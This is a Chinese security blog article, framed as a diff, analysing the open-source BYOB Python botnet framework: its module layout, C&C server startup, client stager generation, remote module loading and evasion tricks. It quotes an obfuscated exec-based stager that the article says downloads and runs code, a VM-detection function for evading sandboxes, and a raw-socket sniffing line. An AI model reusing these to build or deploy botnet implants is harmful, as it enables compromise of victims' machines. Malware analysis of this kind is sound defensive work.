@@ -1,0 +1,179 @@
+***本文作者：傻傻傻傻傻子，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
+## 前言
+
+**Byob是一个开源的僵尸网络框架，在Github上有2k的star了，最近抽时间看了代码，分析一下。Botnet指的是，攻击者编写程序，该程序可自动在网络空间中利用漏洞控制计算机并以该计算机作为节点，继续扩散，作者可以通过Server端下发指令，控制节点，进行诸如DOS攻击等操作。曾经我也参与处理过一次校园网的僵尸网络事件[渗透测试。**
+
+ **![byob](https://image.3001.net/images/20181030/15408716747007.png!small)**
+
+## 0x01 整体介绍
+
+[应急响应-僵尸网络挖矿](https://blog.donot.me/cert-1/)目前出现的一些僵尸网络主要利用已知nday漏洞，我觉得僵尸网络可怕之处不在其利用漏洞的复杂性，而在于其通过网络边界进而可对内网的应用进行自动化攻击，而自动化决定漏洞的利用难度较低。常见僵尸网络利用的漏洞包括：弱口令、未授权、中间件RCE、通用框架RCE等。
+
+Byob是一个用Python编写的僵尸网络框架，说实话我觉得python并不适合作为僵尸网络程序的编写工具，有几个原因：
+
+> 1\. python对各类库依赖性较强
+>
+> 2\. python不同版本、平台上需要处理兼容性
+>
+> 3\. 一些功能的实现可能相对其他语言简单，但是可能隐蔽性不好
+
+针对第一个问题，byob框架采用了远程加载模块的方式进行解决，但是作为不擅长非脚本语言的我来说这个框架是一个非常好的研究对象，不管是编码风格还是一些细节处理上都值得我去分析学习一波。
+
+## 0x02 结构特点
+
+    
+    
+    byob/
+    
+    ├── byob
+    
+    │ ├── byob_bmb.py 使用client.py生成的在被控节点运行的脚本
+    
+    │ ├── client.py
+    
+    │ ├── core 核心框架代码目录
+    
+    │ │ ├── database.py 数据库操作相关
+    
+    │ │ ├── generators.py
+    
+    │ │ ├── handler.py http协议处理
+    
+    │ │ ├── __init__.py
+    
+    │ │ ├── loader.py 远程加载器
+    
+    │ │ ├── payloads.py 接受控制模块
+    
+    │ │ ├── security.py 加解密处理
+    
+    │ │ ├── stagers.py
+    
+    │ │ ├── util.py 通用函数
+    
+    │ ├── data
+    
+    │ ├── database.db
+    
+    │ ├── __init__.py
+    
+    │ ├── modules 利用模块目录
+    
+    │ │ ├── escalate.py 权限提升，其实是runas
+    
+    │ │ ├── icloud.py 用于MAC OS检测登录icloud账号
+    
+    │ │ ├── __init__.py
+    
+    │ │ ├── keylogger.py 键盘记录
+    
+    │ │ ├── outlook.py 收集outlook客户端数据
+    
+    │ │ ├── packetsniffer.py 嗅探
+    
+    │ │ ├── payloads
+    
+    │ │ │ └── bmb.py
+    
+    │ │ ├── persistence.py 隐藏后门的一些东西，有定时任务、WMi等一些操作
+    
+    │ │ ├── phone.py 发送短信
+    
+    │ │ ├── portscanner.py 端口扫描,TCP+ping
+    
+    │ │ ├── process.py 获取系统上的进程
+    
+    │ │ ├── ransom.py 加密文件，RSA对称加密，丝毫不慌
+    
+    │ │ ├── screenshot.py 截屏
+    
+    │ │ ├── stagers
+    
+    │ │ │ └── bmb.py
+    
+    │ │ ├── util.py
+    
+    │ │ └── webcam.py 目标网络摄像头控制权
+    
+    │ ├── requirements.txt
+    
+    │ ├── server.py Server端
+    
+    │ └── setup.py
+    
+    ├── LICENSE
+    
+    └── README.md
+
+从这个框架目前的功能来看，属于一个较为优秀的C&C了，但是针对僵尸网络的自动化漏洞利用扩散上，还没有这些模块，作为一个框架，提供了大的基础。除此之外，该框架还包含了一些windows环境下的功能，包括WMI等等，整体还是有许多值得学习的地方。
+
+## 0x03 Server端
+
+Server端总共监听了三个端口，两个Webserver一个C&C控制端口。Webserver用于远程加载python模块，
+Webroot分别位于系统模块目录site-packages和byob的modules目录。
+
+    
+    
+    globals()['debug'] = options.debug
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
+    globals()['c2'].run()
+
+其他的没啥特别的，主要是看他怎么管理Session的，以及一些控制节点是怎么实现的。不细说了。
+
+## 0x04 Client代码生成
+
+Client.py是一个生成一句话回连代码的脚本。生成的代码：
+
+    
+    
+    import zlib,base64,marshal,urllib,json;exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrdmZgYCgtysnJTNIDUvkFqXka6hklJQVW+vqGhpZ6RpZ65qZ6RgaGVoYGQKCvX1ySmJ5aVKyflJukV1CprqlXlJqYoqEJAAL6FQ4=')))))
+
+可以看出，其实还是依赖远程下载执行，完整的功能代码会生成在modules/payloads/bmb.py中，这个代码又是通过modules/stagers/bmb.py进行加载。modules/payloads/bmb.py中的代码是byob/core下的loader.py/security.py/payloads.py几个组成的。用于和Server交互的代码主要位于payloads.py中。
+
+在Loader.py中新定义了Python模块加载器，用于加载远程模块。
+
+## 0x05 技巧
+
+### 5.1 托管payload
+
+使用pastebin托管payload，提高匿名性。当然还有其他的一些，比如Dropbox等。
+
+### 5.2 可扩展性
+
+由于Byob设计之初就是作为一个僵尸网络框架，所以其扩展性非常好，方便后期对僵尸网络新增一些功能模块等，Byob通过远程加载来进行实现，而其他的非脚本性语言如何能做到不完全替换原来运行状态的情况下进行扩展也是值得借鉴。
+
+### 5.3 虚拟机检测
+
+    
+    
+    def environment():
+    
+        environment = [key for key in os.environ if 'VBOX' in key]
+    
+        processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
+    
+        return bool(environment + processes)
+
+也比较简单，通过环境变量进行检测，避免掉进了蜜罐什么的。
+
+### 5.4 本地抓包
+
+    
+    
+    sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+
+python版本地抓包
+
+## 0x06 相关链接
+
+> <https://github.com/malwaredllc/byob>
+>
+>
+> [Python引入Module机制](https://blog.csdn.net/u010786109/article/details/51837146)
+
+ ***本文作者：傻傻傻傻傻子，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
